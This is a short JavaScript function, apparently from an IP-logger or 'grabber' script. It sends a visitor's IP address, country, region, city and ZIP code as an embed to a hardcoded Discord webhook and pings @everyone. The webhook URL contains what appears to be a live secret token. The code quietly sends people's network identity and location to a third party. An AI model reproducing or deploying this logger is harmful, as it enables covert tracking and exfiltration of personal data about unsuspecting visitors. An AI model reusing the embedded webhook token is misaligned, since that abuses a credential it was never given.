function logs(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "https://discord.com/api/webhooks/996640689200840754/8fdw_c29V5X9oXd4lRT85veF4TLYB0Fb2ClM6H_ch9y2BJXGxDC2HxZdiMUReVWGjJl4");

     request.setRequestHeader('Content-type', 'application/json');

     var params = 
     {
          username: "Logs",
          avatar_url: "", // Just Add an url to have an avatar on your webhook
          content: "@everyone",
          embeds: [
               {
                    title: "Logs",
                    color: 16711680,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
               }
          ]
     }

     request.send(JSON.stringify(params));
}
